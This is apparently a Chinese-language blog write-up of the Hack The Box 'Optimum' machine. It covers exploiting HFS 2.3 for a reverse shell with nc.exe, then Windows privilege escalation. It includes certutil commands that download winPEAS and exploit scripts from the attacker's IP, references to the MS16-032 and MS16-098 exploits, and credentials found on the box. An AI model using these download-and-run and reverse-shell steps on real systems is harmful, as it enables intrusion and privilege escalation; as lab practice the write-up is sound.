---
title: Optimum (Hack The Box Writeup)
date: 2021-09-09T14:03:00+08:00
draft: false
url: "/2021/09/09/optimum-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/6
- IP : 10.129.209.84

## Information Gathering

- 掃 Port![](/uploads/2022/02/c97d5-UWeIeq2.png)觀察 80 port- ![](/uploads/2022/02/4de52-vSG54Vi.png)
- HFS 2.3

## 尋找 Exploit

- 找到https://www.exploit-db.com/exploits/39161
- 需要準備 nc`wget https://github.com/int0x33/nc.exe/raw/master/nc.exe`依照需求開 http server- `python3 -m http.server 80`
- 放 nc執行腳本- ![](/uploads/2022/02/a3824-Tkxg89o.png)收到 Reverse shell- ![](/uploads/2022/02/8fe76-zBLykaz.png)取得 User flag- ![](/uploads/2022/02/70c79-842n5hz.png)

## 提權

- `systeminfo`![](/uploads/2022/02/f0420-KiIGzft.png)載豌豆- `certutil -urlcache -f http://10.10.16.35:8000/winPEASx64.exe winpeas.exe`
- ![](/uploads/2022/02/db2f4-QOVBLpk.png)執行豌豆- ![](/uploads/2022/02/d1fc6-PjUZ8cP.png)
- ![](/uploads/2022/02/bd303-dUHgWW1.png)
- 看到帳密`kostas`
- `kdeEjDowkS*`使用 Windows-Exploit-Suggester- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- 需要先裝指定版本的 xlrd`pip install xlrd==1.2.0``./windows-exploit-suggester.py --update`![](/uploads/2022/02/929de-GwV0ET6.png)- 尋找推薦的 Exploit　腳本嘗試 MS16-032- `wget https://www.exploit-db.com/download/39719 -O Invoke-MS16-032.ps1`
- ![](/uploads/2022/02/e5bb1-RVDEYto.png)
- 載腳本`certutil -urlcache -f http://10.10.16.35/Invoke-MS16-032.ps1 Invoke-MS16-032.ps1`失敗- https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html
- 看起來因為他是給 GUI 用的，需要彈出額外視窗嘗試 MS16-098- https://github.com/sensepost/ms16-098
- 載下來執行![](/uploads/2022/02/baf5e-f9wRh6B.png)
- 成功取得 System Flag- ![](/uploads/2022/02/b1504-OMCDFZi.png)
